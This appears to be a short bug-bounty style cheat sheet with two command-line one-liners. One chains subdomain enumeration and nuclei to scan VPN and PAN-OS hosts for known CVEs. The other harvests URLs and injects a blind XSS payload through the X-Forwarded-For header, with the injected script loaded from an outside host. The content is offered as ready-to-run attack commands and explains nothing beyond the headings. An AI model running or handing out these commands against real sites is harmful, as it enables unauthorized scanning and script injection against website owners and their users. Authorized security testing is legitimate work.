## Juicy Vulnerabilities in a Minutes
```
subdominator -d example[.]com | httpx -silent | grep -i vpn | nuclei -tags panos,vpn | grep -i cve
```
## Blind XSS via X-Forwarded-For Header
```
subfinder -d test.com | gau | bxss -payload '"><script src=https://rahul.bxss.in></script>' -header "X-Forwarded-For"
```
